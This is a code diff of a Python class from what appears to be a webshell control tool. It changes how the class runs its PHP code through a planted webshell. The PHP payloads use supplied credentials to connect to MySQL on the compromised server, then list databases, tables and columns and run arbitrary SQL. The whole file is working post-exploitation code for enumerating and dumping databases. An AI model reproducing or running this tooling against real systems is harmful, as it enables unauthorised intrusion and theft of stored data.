@@ -23,7 +23,7 @@ class Mysql():
     def check_connection(self, webshell):
         code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new mysqli($h,$u,$p);if(mysqli_connect_error()){echo mysqli_connect_error();}$c->close();" % (self.ip, self.username, self.password)
         Log.info("Executing : \n%s" % code)
-        result = webshell.php_code_exec(code)
+        result = webshell.php_code_exec_token(code)
         if result[0]:
             content = result[1]
             if content == "":
@@ -50,7 +50,7 @@ class Mysql():
             return
         code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$s='select database()';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password)
         Log.info("Executing : \n%s" % code)
-        result = self.webshell.php_code_exec(code)
+        result = self.webshell.php_code_exec_token(code)
         if result[0]:
             content = result[1]
             database = content
@@ -65,7 +65,7 @@ class Mysql():
             return
         code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$s='select user()';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password)
         Log.info("Executing : \n%s" % code)
-        result = self.webshell.php_code_exec(code)
+        result = self.webshell.php_code_exec_token(code)
         if result[0]:
             content = result[1]
             user = content
@@ -80,7 +80,7 @@ class Mysql():
             return
         code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$s='select @@version';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password)
         Log.info("Executing : \n%s" % code)
-        result = self.webshell.php_code_exec(code)
+        result = self.webshell.php_code_exec_token(code)
         if result[0]:
             content = result[1]
             version = content
@@ -95,7 +95,7 @@ class Mysql():
             return
         code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$c->select_db('information_schema');$s='select schema_name from information_schema.schemata';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password)
         Log.info("Executing : \n%s" % code)
-        result = self.webshell.php_code_exec(code)
+        result = self.webshell.php_code_exec_token(code)
         if result[0]:
             content = result[1]
             databases = content.split(",")[0:-1]
@@ -107,7 +107,7 @@ class Mysql():
     def get_table_from_database(self, database):
         code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$c->select_db('%s');$s='select table_name from information_schema.tables where table_schema = \"%s\"';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password, database, database)
         Log.info("Executing : \n%s" % code)
-        result = self.webshell.php_code_exec(code)
+        result = self.webshell.php_code_exec_token(code)
         if result[0]:
             content = result[1]
             tables = content.split(",")[0:-1]
@@ -118,7 +118,7 @@ class Mysql():
     def get_columns_from_table(self, tablename, database):
         code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$c->select_db('%s');$s='select column_name from information_schema.columns where table_name = \"%s\"';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password, database, tablename)
         Log.info("Executing : \n%s" % code)
-        result = self.webshell.php_code_exec(code)
+        result = self.webshell.php_code_exec_token(code)
         if result[0]:
             content = result[1]
             columns = content.split(",")[0:-1]
@@ -130,7 +130,7 @@ class Mysql():
         # TODO 数据显示不完整的 BUG
         code = "error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$s='%s';$r=$c->query($s);while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password, sql)
         Log.info("Executing : \n%s" % code)
-        result = self.webshell.php_code_exec(code)
+        result = self.webshell.php_code_exec_token(code)
         if result[0]:
             content = result[1]
             Log.success(content)
